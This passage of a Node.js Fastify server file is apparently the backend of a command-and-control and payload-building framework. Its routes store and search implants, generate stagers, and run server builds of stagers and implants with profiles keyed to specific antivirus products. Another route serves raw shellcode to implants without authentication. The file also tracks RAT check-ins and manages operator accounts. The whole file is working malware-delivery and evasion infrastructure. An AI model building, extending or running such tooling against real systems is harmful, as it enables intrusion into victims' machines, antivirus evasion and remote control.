    description: 'Get a component by id',
    tags: ['Component'],
    summary: 'get a component by id',
    params: {
      type: 'object',
      properties: {
        component_id: { type: 'string' }
      }
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'object',
        properties: {
          title: { type: 'string' },
          description: { type: 'string' },
          author: { type: 'string' },
          parameters: { type: 'string' }
        }
      }
    }
  },
  handler: async function (req, reply) {
    let component_id = req.params.component_id
    let get_component = db.prepare(`SELECT id, title, description, author, parameters FROM components WHERE id = $component_id`)
    let component = get_component.get({ component_id: component_id })
    reply.type('application/json').send(JSON.stringify(component))
  }
})

//API route to generate a component based on a component id and supplied parameters
fastify.route({
  method: ['POST'],
  url: '/api/components/:component_id/generate',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Generate a component based on a component id and supplied parameters',
    tags: ['Component'],
    summary: 'generate a component based on a component id and supplied parameters',
    params: {
      type: 'object',
      properties: {
        parameters: { type: 'object' }
      }
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'string'
      }

    }
  },
  handler: async function (req, reply) {
    let component_id = req.params.component_id
    let parameters = req.body
    let get_component = db.prepare(`SELECT * FROM components WHERE id = $component_id`)
    let component = get_component.get({ component_id: component_id })
    component.parameters = parameters
    let { ComponentHandler } = await import(component.component_handler)
    let component_handler = new ComponentHandler(component)
    component_handler.generateComponent(req, reply)
  }
})

//API route to save an implant to the db
fastify.route({
  method: ['POST'],
  url: '/api/implant/save',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Save an implant to the db',
    tags: ['Implant'],
    summary: 'save an implant to the db',
    body: {
      type: 'object',
      properties: {
        id: { type: 'string' },
        notes: { type: 'string' },
        code: { type: 'string' },
        language: { type: 'string' },
        task_type: { type: 'string' },
      }
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'string'
      }
    }
  },
  handler: async function (req, reply) {
    //add implant to db
    let add_implant = db.prepare(`INSERT INTO implants (id, notes, code, language, task_type) VALUES ($id, $notes, $code, $language, $task_type)`)
    add_implant.run({ id: req.body.id, notes: req.body.notes, code: req.body.code, language: req.body.language, task_type: req.body.task_type })
    reply.type('application/json').send(JSON.stringify({ id: req.body.id}))
  }
})

//API route to search implants
fastify.route({
  method: ['GET'],
  url: '/api/search/implants',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Get a list of implants by language, task type, and notes',
    tags: ['Implant'],
    summary: 'get a list of implants by language, task type, and notes',
    querystring: {
      type: 'object',
      properties: {
        language: { type: 'string' },
        task_type: { type: 'string' },
        notes: { type: 'string' }
      }
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'array',
        items: {
          type: 'object'
        }
      }
    }
  },
  handler: async function (req, reply) {
    let language = req.query.language || ''
    let task_type = req.query.task_type || ''
    let notes = req.query.notes || ''
    let get_implants = db.prepare(`SELECT id, notes, language, task_type, code FROM implants WHERE language LIKE $language AND task_type LIKE $task_type AND notes LIKE $notes`)
    let implants = get_implants.all({ language: `%${language}%`, task_type: `%${task_type}%`, notes: `%${notes}%` })
    reply.type('application/json').send(JSON.stringify(implants))
  }
})

//API to get saved Implant by id
fastify.route({
  method: ['GET'],
  url: '/api/implant/:implant_id',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Get a saved implant by id',
    tags: ['Implant'],
    summary: 'get a saved implant by id',
    params: {
      type: 'object',
      properties: {
        implant_id: { type: 'string' }
      }
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'object',
      }
    }
  },
  handler: async function (req, reply) {
    let implant_id = req.params.implant_id
    let get_implant = db.prepare(`SELECT * FROM implants WHERE id = $implant_id`)
    let implant = get_implant.get({ implant_id: implant_id })
    reply.type('application/json').send(JSON.stringify(implant))
  }
})

//API route to reload modules without restarting the server
fastify.route({
  method: ['PUT'],
  url: '/api/reload_modules',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Reload modules without restarting the server',
    tags: ['Module'],
    summary: 'reload modules without restarting the server',
    response: {
      200: {
        description: 'Successful response',
        type: 'string'
      }
    }
  },
  handler: async function (req, reply) {
    await load_modules()
    reply.type('text/plain').send('reloaded modules')
  }
})

//API route to search stager components
fastify.route({
  method: ['GET'],
  url: '/api/search/stager_components',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Get a list of stager components by payload type, file type, and description',
    tags: ['Stager'],
    summary: 'get a list of stager components by payload type, file type, and description',
    querystring: {
      type: 'object',
      properties: {
        payload_type: { type: 'string' },
        file_type: { type: 'string' },
        description: { type: 'string' }
      }
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'array',
        items: {
          type: 'object'
        }
      }
    }
  },
  handler: async function (req, reply) {
    let payload_type = req.query.payload_type || ''
    let file_type = req.query.file_type || ''
    let description = req.query.description || ''
    let get_stager_components = db.prepare(`SELECT id, directory, title, payload_type, file_type, description FROM stager_components WHERE payload_type LIKE $payload_type AND file_type LIKE $file_type AND description LIKE $description`)
    let stager_components = get_stager_components.all({ payload_type: `%${payload_type}%`, file_type: `%${file_type}%`, description: `%${description}%` })
    reply.type('application/json').send(JSON.stringify(stager_components))
  }
})

//API route to search stager component by payload type, directory, and file type
fastify.route({
  method: ['GET'],
  url: '/api/exact_search/stager_components',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Get stager component by payload type, file type, and directory',
    tags: ['Stager'],
    summary: 'get a stager component by payload type, file type, and directory',
    querystring: {
      type: 'object',
      properties: {
        payload_type: { type: 'string' },
        file_type: { type: 'string' },
        directory: { type: 'string' }
      }
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'array',
        items: {
          type: 'object'
        }
      }
    }
  },
  handler: async function (req, reply) {
    let payload_type = req.query.payload_type || ''
    let file_type = req.query.file_type || ''
    let directory = req.query.directory || ''
    let get_stager_components = db.prepare(`SELECT * FROM stager_components WHERE payload_type = $payload_type AND file_type = $file_type AND directory = $directory`)
    let stager_component = get_stager_components.get({ payload_type: `${payload_type}`, file_type: `${file_type}`, directory: `${directory}` })
    reply.type('application/json').send(JSON.stringify(stager_component))
  }
})

//API route to get a stager component by id
fastify.route({
  method: ['GET'],
  url: '/api/stager_component/:component_id',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Get a stager component by id',
    tags: ['Stager'],
    summary: 'get a stager component by id',
    params: {
      type: 'object',
      properties: {
        component_id: { type: 'string' }

      }
    },
    response: {
      200: {
        description: 'Successful response',

        type: 'object'
      }
    }
  },
  handler: async function (req, reply) {
    let component_id = req.params.component_id
    let get_stager_component = db.prepare(`SELECT id, title, payload_type, file_type, author, description, parameters, mitre, reference_links FROM stager_components WHERE id = $component_id`)
    let stager_component = get_stager_component.get({ component_id: component_id })
    reply.type('application/json').send(JSON.stringify(stager_component))
  }
})

//API route to generate a stager based on supplied parameters
fastify.route({
  method: ['POST'],
  url: '/api/stager_components/:stager_component_id/generate',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Generate a stager based on supplied parameters',
    tags: ['Stager'],
    summary: 'generate a stager based on supplied parameters',
    params: {
      type: 'object',
      properties: {
        stager_component_id: { type: 'string' }
      }
    },
    body: {
      type: 'object',
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'string'
      }
    }
  },
  handler: async function (req, reply) {
    let stager_component_id = req.params.stager_component_id
    let stager_component = db.prepare(`SELECT * FROM stager_components WHERE id = $stager_component_id`).get({ stager_component_id: stager_component_id })
    stager_component.parameters = req.body
    let stager_handler_path = stager_component.stager_component_handler
    let { StagerHandler } = await import(stager_handler_path)
    let stager_handler = new StagerHandler(stager_component)
    stager_handler.generateStager(req, reply)
  }
})

//API route to save a stager
fastify.route({
  method: ['POST'],
  url: '/api/stager/save',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Save a stager',
    tags: ['Stager'],
    summary: 'save a stager',
    body: {
      type: 'object',
      properties: {
        code: { type: 'string' },
        implant_name: { type: 'string' },
        stager_name: { type: 'string' },
        file_type: { type: 'string' }
      }
    },
    response: {
      200: {
        description: 'Successful response',
        type: 'string'
      }
    }
  },
  handler: async function (req, reply) {
    let code = req.body.code
    let implant_name = req.body.implant_name
    let stager_name = req.body.stager_name
    let file_type = req.body.file_type
    let stager_id = Math.random().toString(36).slice(2).substring(0, 6)
    let save_stager = db.prepare(`INSERT INTO stagers (id, code, implant_name, stager_name, file_type) VALUES ($id, $code, $implant_name, $stager_name, $file_type)`) 
    save_stager.run({ id: stager_id, code: code, implant_name: implant_name, stager_name: stager_name, file_type: file_type })
    reply.type('application/json').send(JSON.stringify({ id: stager_id }))
  }
})

//API route to list stagers
fastify.route({
  method: ['GET'],
  url: '/api/stagers',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'List stagers',
    tags: ['Stager'],
    summary: 'list stagers',
    querystring: {
      type: 'object',
    }
  },
  handler: async function (req, reply) {
    let stagers = db.prepare(`SELECT * FROM stagers`).all()
    reply.type('application/json').send(JSON.stringify(stagers))
  }
})


// ── Engagement logs ───────────────────────────────────────────────────────────

fastify.route({
  method: ['GET'],
  url: '/api/logs',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Fetch engagement log entries',
    tags: ['Logs'],
    summary: 'get engagement log entries',
    querystring: {
      type: 'object',
      properties: {
        limit:  { type: 'integer' },
        since:  { type: 'integer' },
        event:  { type: 'string'  },
        rat_id: { type: 'string'  },
        imp_id: { type: 'string'  }
      }
    }
  },
  handler: async function (req, reply) {
    const limit  = Math.min(parseInt(req.query.limit  || '200'), 1000)
    const since  = parseInt(req.query.since  || '0')
    const event  = req.query.event  || ''
    const rat_id = req.query.rat_id || ''
    const imp_id = req.query.imp_id || ''
    let   query  = `SELECT * FROM logs WHERE ts >= ? AND event LIKE ?`
    const args   = [since, `%${event}%`]
    if (rat_id) { query += ` AND rat_id = ?`; args.push(rat_id) }

    if (!req.currentUser.isAdmin) {
      const allowed = userImplantIds(req.currentUser.id)
      if (allowed.length === 0) { reply.send([]); return }
      if (imp_id) {
        if (!allowed.includes(imp_id)) { reply.send([]); return }
        query += ` AND imp_id = ?`; args.push(imp_id)
      } else {
        query += ` AND imp_id IN (${allowed.map(() => '?').join(',')})`
        args.push(...allowed)
      }
    } else if (imp_id) {
      query += ` AND imp_id = ?`; args.push(imp_id)
    }

    query += ` ORDER BY ts DESC LIMIT ?`
    args.push(limit)
    reply.send(db.prepare(query).all(...args))
  }
})

// ── User management ───────────────────────────────────────────────────────────

fastify.route({
  method: ['GET'],
  url: '/api/users',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'List operator accounts (usernames only, no keys)',
    tags: ['Users'],
    summary: 'list users',
    response: { 200: { type: 'array', items: { type: 'object', properties: {
      id:      { type: 'string' },
      username: { type: 'string' },
      imp_ids: { type: 'array', items: { type: 'string' } }
    }, additionalProperties: false } } }
  },
  handler: async function (req, reply) {
    const users = db.prepare(`SELECT id, username FROM users ORDER BY username`).all()
    reply.send(users.map(u => ({
      id:      u.id,
      username: u.username,
      imp_ids: db.prepare(`SELECT imp_id FROM user_implants WHERE user_id = ?`).all(u.id).map(r => r.imp_id)
    })))
  }
})

fastify.route({
  method: ['POST'],
  url: '/api/users',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Create an operator account — returns the API key (shown once)',
    tags: ['Users'],
    summary: 'create user',
    body: { type: 'object', required: ['username'], properties: { username: { type: 'string' } } },
    response: { 200: { type: 'object', properties: { id: { type: 'string' }, username: { type: 'string' }, api_key: { type: 'string' } } } }
  },
  handler: async function (req, reply) {
    const username = (req.body.username || '').trim()
    if (!username) { reply.code(400).send({ error: 'username required' }); return }
    const existing = db.prepare(`SELECT id FROM users WHERE username = ?`).get(username)
    if (existing) { reply.code(409).send({ error: 'username already exists' }); return }
    const id      = randomBytes(8).toString('hex')
    const api_key = randomBytes(24).toString('hex')
    db.prepare(`INSERT INTO users (id, username, api_key) VALUES (?, ?, ?)`).run(id, username, api_key)
    reply.send({ id, username, api_key })
  }
})

fastify.route({
  method: ['DELETE'],
  url: '/api/users/:username',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Delete an operator account',
    tags: ['Users'],
    summary: 'delete user',
    params: { type: 'object', properties: { username: { type: 'string' } } },
    response: { 200: { type: 'object', properties: { deleted: { type: 'boolean' } } } }
  },
  handler: async function (req, reply) {
    const result = db.prepare(`DELETE FROM users WHERE username = ?`).run(req.params.username)
    reply.send({ deleted: result.changes > 0 })
  }
})

fastify.route({
  method: ['GET'],
  url: '/api/users/:username/implants',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'List implant IDs a user has access to',
    tags: ['Users'],
    summary: 'list user implant access',
    params: { type: 'object', properties: { username: { type: 'string' } } },
    response: { 200: { type: 'array', items: { type: 'string' } } }
  },
  handler: async function (req, reply) {
    const user = db.prepare(`SELECT id FROM users WHERE username = ?`).get(req.params.username)
    if (!user) { reply.code(404).send({ error: 'user not found' }); return }
    reply.send(db.prepare(`SELECT imp_id FROM user_implants WHERE user_id = ?`).all(user.id).map(r => r.imp_id))
  }
})

fastify.route({
  method: ['POST'],
  url: '/api/users/:username/implants',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Grant a user access to an implant ID',
    tags: ['Users'],
    summary: 'grant implant access',
    params: { type: 'object', properties: { username: { type: 'string' } } },
    body: { type: 'object', required: ['imp_id'], properties: { imp_id: { type: 'string' } } },
    response: { 200: { type: 'object', properties: { granted: { type: 'boolean' }, username: { type: 'string' }, imp_id: { type: 'string' } } } }
  },
  handler: async function (req, reply) {
    const user = db.prepare(`SELECT id FROM users WHERE username = ?`).get(req.params.username)
    if (!user) { reply.code(404).send({ error: 'user not found' }); return }
    const imp_id = (req.body.imp_id || '').trim()
    if (!imp_id) { reply.code(400).send({ error: 'imp_id required' }); return }
    db.prepare(`INSERT OR IGNORE INTO user_implants (user_id, imp_id) VALUES (?, ?)`).run(user.id, imp_id)
    reply.send({ granted: true, username: req.params.username, imp_id })
  }
})

fastify.route({
  method: ['DELETE'],
  url: '/api/users/:username/implants/:imp_id',
  schema: {
    security: [{ cookieAuth: [] }],
    description: 'Revoke a user\'s access to an implant ID',
    tags: ['Users'],
    summary: 'revoke implant access',
    params: { type: 'object', properties: { username: { type: 'string' }, imp_id: { type: 'string' } } },
    response: { 200: { type: 'object', properties: { revoked: { type: 'boolean' } } } }
  },
  handler: async function (req, reply) {
    const user = db.prepare(`SELECT id FROM users WHERE username = ?`).get(req.params.username)
    if (!user) { reply.code(404).send({ error: 'user not found' }); return }
    const result = db.prepare(`DELETE FROM user_implants WHERE user_id = ? AND imp_id = ?`).run(user.id, req.params.imp_id)
    reply.send({ revoked: result.changes > 0 })
  }
})

// ── Server-side builds ────────────────────────────────────────────────────────

const build_jobs = new Map()  // job_id → {status, lines, artifacts, started}
// artifacts entries: { name, size, filepath }  (filepath is internal, not sent to client)

const STAGERS_DIR = path.join(__dirname, 'backdoors', 'stagers')
const IMPLANT_DIR = path.join(__dirname, 'backdoors', 'implant')

// Return only the final deliverable files for a given build type + config.
// Intermediate files (stager_release.exe, beacon.bin, implant_patched.exe)
// are never included — they are internal build steps, not outputs.
function collect_artifacts(type, config) {
  const results = []

  const stager_name   = (config.stager_filename  || 'stager_release.exe').trim()
  const implant_name  = (config.implant_filename  || '').trim()
  const zip_name      = (config.zip_filename      || 'payload.zip').trim()

  const try_add = (dir, name) => {
    const fp = path.join(dir, name)
    try {
      const stat = fs.statSync(fp)
      if (stat.isFile()) results.push({ name, size: stat.size, filepath: fp })
    } catch (_) {}
  }

  if (type === 'stager' || type === 'all') {
    try_add(STAGERS_DIR, stager_name)
  }

  if (type === 'implant' || type === 'all') {
    // Named .bin takes priority; fall back to beacon.bin if no implant_filename set
    if (implant_name) {
      try_add(IMPLANT_DIR, implant_name + '.bin')
    } else {
      try_add(IMPLANT_DIR, 'beacon.bin')
    }
    try_add(IMPLANT_DIR, 'implant_patched.exe')
  }

  if (type === 'zip') {
    try_add(STAGERS_DIR, zip_name)
  }

  return results
}

// ── Build profiles ──────────────────────────────────────────────────────────
// Profiles map AV product names to tested component configurations.
// The frontend shows these as simple "Target AV" options; the raw component
// selectors remain available under an "Advanced" tab.

const PROFILES_PATH = path.join(__dirname, 'builder', 'profiles.json')

function load_profiles() {
  try {
    return JSON.parse(fs.readFileSync(PROFILES_PATH, 'utf8')).profiles || []
  } catch (_) {
    return []
  }
}

// GET /api/build/profiles — list available AV target profiles
fastify.route({
  method: ['GET'],
  url: '/api/build/profiles',
  handler: async function (req, reply) {
    if (!req.currentUser) {
      return reply.code(401).send({ error: 'Unauthorized' })
    }
    const profiles = load_profiles()
    // Return public fields only (no internal config details unless requested)
    const detail = req.query.detail === 'full'
    const result = profiles.map(p => {
      const entry = { id: p.id, name: p.name, description: p.description }
      if (detail) entry.config = p.config
      return entry
    })
    return reply.send({ profiles: result })
  }
})

// POST /api/build — start a build job on the server
fastify.route({
  method: ['POST'],
  url: '/api/build',
  handler: async function (req, reply) {
    if (!req.currentUser) {
      return reply.code(401).send({ error: 'Unauthorized' })
    }
    const { type, config } = req.body || {}
    if (!['all', 'stager', 'implant', 'zip'].includes(type)) {
      return reply.code(400).send({ error: 'type must be all | stager | implant | zip' })
    }
    if (!config || typeof config !== 'object') {
      return reply.code(400).send({ error: 'config must be a JSON object' })
    }

    // If a profile is specified, merge its component selections as defaults.
    // Explicit component_* fields in the config override the profile.
    if (config.profile) {
      const profiles = load_profiles()
      const profile = profiles.find(p => p.id === config.profile)
      if (profile) {
        for (const [key, val] of Object.entries(profile.config)) {
          if (!(key in config)) {
            config[key] = val
          }
        }
      } else {
        return reply.code(400).send({ error: `Unknown profile: ${config.profile}` })
      }
    }

    // Auto-grant the submitting user access to the imp_id they're building for
    // so that when the rat checks in they can see it without needing admin intervention
    if (!req.currentUser.isAdmin && config.imp_id) {
      db.prepare(`INSERT OR IGNORE INTO user_implants (user_id, imp_id) VALUES (?, ?)`)
        .run(req.currentUser.id, config.imp_id)
    }

    const job_id = randomBytes(8).toString('hex')
    const job = { status: 'running', lines: [], artifacts: [], started: Date.now() }
    build_jobs.set(job_id, job)

    const build_script = path.join(__dirname, 'builder', 'server_build.py')
    const proc = spawn('python3', ['-B', build_script, '--type', type, '--config', JSON.stringify(config)], {
      cwd: __dirname,
      env: { ...process.env },
      stdio: ['ignore', 'pipe', 'pipe'],
    })

    const push = (data) => data.toString().split('\n').filter(l => l.trim()).forEach(l => job.lines.push(l))
    proc.stdout.on('data', push)
    proc.stderr.on('data', push)

    proc.on('close', (code) => {
      job.status = code === 0 ? 'done' : 'failed'
      if (code === 0) {
        job.artifacts = collect_artifacts(type, config)
        job.artifacts.forEach(a => { try { fs.chmodSync(a.filepath, 0o644) } catch (_) {} })
      }
    })

    return reply.send({ job_id })
  }
})

// GET /api/build/:id — poll job status and output
fastify.route({
  method: ['GET'],
  url: '/api/build/:id',
  handler: async function (req, reply) {
    const job = build_jobs.get(req.params.id)
    if (!job) return reply.code(404).send({ error: 'Job not found' })
    return reply.send({
      status: job.status,
      lines: job.lines,
      artifacts: job.artifacts.map(a => ({ name: a.name, size: a.size })),
      started: job.started,
    })
  }
})

// GET /api/build/:id/artifact/:filename — download a build artifact
fastify.route({
  method: ['GET'],
  url: '/api/build/:id/artifact/:filename',
  handler: async function (req, reply) {
    const job = build_jobs.get(req.params.id)
    if (!job) return reply.code(404).send({ error: 'Job not found' })
    const filename = req.params.filename.replace(/[^a-zA-Z0-9_\-\.]/g, '')
    const artifact = job.artifacts.find(a => a.name === filename)
    if (!artifact || !fs.existsSync(artifact.filepath)) {
      return reply.code(404).send({ error: 'Artifact not found' })
    }
    reply.header('Content-Disposition', `attachment; filename="${filename}"`)
    return reply.type('application/octet-stream').send(fs.readFileSync(artifact.filepath))
  }
})

// ── Shellcode hosting ────────────────────────────────────────────────────────

// Serve a static shellcode file by filename (implant-facing, no auth required).
// Operator places raw shellcode files in ./shellcode/ on the server.
// e.g. ./shellcode/beacon.bin is served at GET /api/shellcode/beacon.bin
fastify.route({
  method: ['GET'],
  url: '/api/shellcode/:filename',
  schema: {
    description: 'Fetch a shellcode file by name',
    tags: ['Shellcode'],
    summary: 'fetch shellcode',
    params: {
      type: 'object',
      properties: {
        filename: { type: 'string' }
      }
    }
  },
  handler: async function (req, reply) {
    // Sanitise filename — only allow alphanumeric, dash, underscore, dot
    let filename = req.params.filename.replace(/[^a-zA-Z0-9_\-\.]/g, '')
    let filepath = path.join(__dirname, 'shellcode', filename)
    if (!fs.existsSync(filepath)) {
      reply.code(404).send('')
      return
    }
    let data = fs.readFileSync(filepath)
    reply.type('application/octet-stream').send(data)
  }
})

// ─────────────────────────────────────────────────────────────────────────────

fastify.ready(function (err) {
  if (err) throw err

  //Add auth to make sure arbitrary clients can't listen in on these events
  fastify.io.use((socket, next) => {
    const token = socket.handshake.auth.token;
    if(token === SOCKET_KEY){
      next()
    }else{
      next(new Error("thou shall not pass"));
    }
  });
  
  fastify.io.on('connect', function (socket) {
    console.log('Socket connected!', socket.id)
  })
})

// Run the server!
const start = async () => {
  fastify.listen(1337, (err) => {
    if (err) {
      fastify.log.error(err)
      process.exit(1)
    }
    console.log(`server listening on ${fastify.server.address().port}`)
  })
}
start()
